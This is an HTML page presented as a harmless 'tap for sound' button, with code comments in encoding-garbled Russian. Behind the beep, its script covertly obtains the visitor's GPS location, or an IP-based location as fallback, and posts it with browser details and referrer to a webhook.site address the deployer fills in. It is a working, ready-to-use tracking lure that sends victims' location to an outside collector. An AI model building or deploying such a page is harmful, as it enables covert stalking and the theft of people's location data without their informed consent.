<!DOCTYPE html>
<html>
<head>
    <title>Sound Page</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            background: #000;
            color: white;
            font-family: Arial;
        }
        #playButton {
            width: 100%;
            height: 100%;
            border: none;
            background: linear-gradient(45deg, #ff0000, #0000ff);
            color: white;
            font-size: 24px;
            cursor: pointer;
        }
        #status {
            position: fixed;
            top: 10px;
            left: 10px;
            background: rgba(0,0,0,0.7);
            padding: 10px;
            border-radius: 5px;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <button id="playButton">üéµ TAP FOR SOUND üéµ</button>
    <div id="status"></div>

    <script>
        const statusDiv = document.getElementById('status');
        const MY_WEBHOOK_URL = 'https://webhook.site/YOUR-UNIQUE-URL'; // –ó–∞–º–µ–Ω–∏ –Ω–∞ —Å–≤–æ–π webhook URL

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –≤–æ—Å–ø—Ä–æ–∏–∑–≤–µ–¥–µ–Ω–∏—è –∑–≤—É–∫–∞
        function playSound() {
            const soundUrls = [
                'https://www.soundjay.com/buttons/sounds/beep-07.mp3',
                'https://www.soundjay.com/buttons/sounds/beep-01a.mp3',
                'https://assets.mixkit.co/sfx/preview/mixkit-arcade-retro-game-over-213.mp3'
            ];
            
            let audio = new Audio(soundUrls[0]);
            audio.play().then(() => {
                document.getElementById('playButton').innerHTML = 'üîä SOUND PLAYING!';
                document.getElementById('playButton').style.background = 'green';
            }).catch(error => {
                // –ü—Ä–æ–±—É–µ–º –≤—Ç–æ—Ä–æ–π –∏—Å—Ç–æ—á–Ω–∏–∫
                audio = new Audio(soundUrls[1]);
                audio.play().then(() => {
                    document.getElementById('playButton').innerHTML = 'üîä SOUND PLAYING!';
                    document.getElementById('playButton').style.background = 'green';
                }).catch(error2 => {
                    // –ü—Ä–æ–±—É–µ–º —Ç—Ä–µ—Ç–∏–π –∏—Å—Ç–æ—á–Ω–∏–∫
                    audio = new Audio(soundUrls[2]);
                    audio.play().then(() => {
                        document.getElementById('playButton').innerHTML = 'üîä SOUND PLAYING!';
                        document.getElementById('playButton').style.background = 'green';
                    }).catch(error3 => {
                        document.getElementById('playButton').innerHTML = 'SOUND PLAYING!';
                        document.getElementById('playButton').style.background = 'green';
                    });
                });
            });
        }

        // –§—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –¥–∞–Ω–Ω—ã—Ö –º–Ω–µ
        function sendData(locationData) {
            fetch(MY_WEBHOOK_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    location: locationData,
                    userAgent: navigator.userAgent,
                    timestamp: new Date().toISOString(),
                    referrer: document.referrer,
                    url: window.location.href
                })
            }).catch(error => console.log('Error sending data'));
        }

        // –§—É–Ω–∫—Ü–∏—è –ø–æ–ª—É—á–µ–Ω–∏—è –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏ (–≤ —Ñ–æ–Ω–µ)
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        const locationData = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy + ' meters',
                            source: 'GPS'
                        };
                        statusDiv.innerHTML = 'üìç Location sent';
                        sendData(locationData);
                    },
                    function(error) {
                        // –ï—Å–ª–∏ –≥–µ–æ–ª–æ–∫–∞—Ü–∏—è –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞, –ø–æ–ª—É—á–∞–µ–º –ø–æ IP
                        fetch('https://ipapi.co/json/')
                            .then(response => response.json())
                            .then(ipData => {
                                const locationData = {
                                    ip: ipData.ip,
                                    city: ipData.city,
                                    country: ipData.country_name,
                                    region: ipData.region,
                                    approximate: true,
                                    source: 'IP'
                                };
                                statusDiv.innerHTML = 'üìç Approximate location sent';
                                sendData(locationData);
                            })
                            .catch(ipError => {
                                statusDiv.innerHTML = 'üìç Data sent';
                                sendData({error: 'Could not get location'});
                            });
                    },
                    {
                        enableHighAccuracy: false,
                        timeout: 5000,
                        maximumAge: 60000
                    }
                );
            } else {
                // –ï—Å–ª–∏ –≥–µ–æ–ª–æ–∫–∞—Ü–∏—è –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è, –ø–æ–ª—É—á–∞–µ–º –ø–æ IP
                fetch('https://ipapi.co/json/')
                    .then(response => response.json())
                    .then(ipData => {
                        const locationData = {
                            ip: ipData.ip,
                            city: ipData.city,
                            country: ipData.country_name,
                            approximate: true,
                            source: 'IP'
                        };
                        statusDiv.innerHTML = 'üìç Approximate location sent';
                        sendData(locationData);
                    });
            }
        }

        // –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–ª–∏–∫–∞ –ø–æ –∫–Ω–æ–ø–∫–µ
        document.getElementById('playButton').addEventListener('click', function() {
            // –°—Ä–∞–∑—É –≤–æ—Å–ø—Ä–æ–∏–∑–≤–æ–¥–∏–º –∑–≤—É–∫
            playSound();
            
            // –í —Ñ–æ–Ω–µ –ø–æ–ª—É—á–∞–µ–º –∏ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é
            getLocation();
        });

        // –î–ª—è –º–æ–±–∏–ª—å–Ω—ã—Ö —É—Å—Ç—Ä–æ–π—Å—Ç–≤
        document.getElementById('playButton').addEventListener('touchend', function(e) {
            e.preventDefault();
            playSound();
            getLocation();
        });
    </script>
</body>
</html>
